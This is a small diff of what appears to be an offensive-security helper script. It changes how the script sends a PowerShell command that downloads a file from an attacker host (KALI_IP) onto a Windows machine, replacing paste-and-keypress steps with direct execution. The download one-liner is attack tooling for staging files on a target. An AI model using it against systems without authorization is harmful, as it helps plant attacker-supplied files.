@@ -16,5 +16,5 @@ PORT=${form_data["port"]}
 PATH=${form_data["path"]}
 FILE_NAME=$(basename $PATH)
 
-paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${PATH}', '${FILE_NAME}')\""
-xdotool key Return
+execute_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${PATH}', '${FILE_NAME}')\""
+create_new_line
